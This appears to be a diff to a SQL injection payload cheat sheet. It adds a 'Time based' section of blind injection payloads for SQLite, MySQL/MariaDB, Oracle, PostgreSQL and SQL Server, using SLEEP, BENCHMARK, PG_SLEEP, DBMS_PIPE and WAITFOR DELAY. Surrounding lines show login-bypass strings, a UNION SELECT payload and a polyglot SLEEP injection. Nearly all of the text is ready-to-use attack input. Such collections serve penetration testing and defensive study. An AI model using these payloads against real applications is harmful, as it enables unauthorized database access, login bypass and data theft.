@@ -170,6 +170,18 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
+## Time based
+```
+SQLite : AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))      comment:   -- /**/
+MySQL/MariaDB : AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1       comment: # -- /*!30100 MySQL code*/ 
+MySQL/MariaDB : RLIKE SLEEP([SLEEPTIME])                                                  comment: # -- /*!30100 MySQL code*/ 
+MySQL/MariaDB : OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))                            comment: # -- /*!30100 MySQL code*/ 
+Oracle : AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
+PostGreSQL : AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))                  comment:   -- /**/  
+PostGreSQL : AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))    comment:   -- /**/
+SQL Server : IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --
+```
+
 ## Polyglot injection (multicontext)
 ```
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
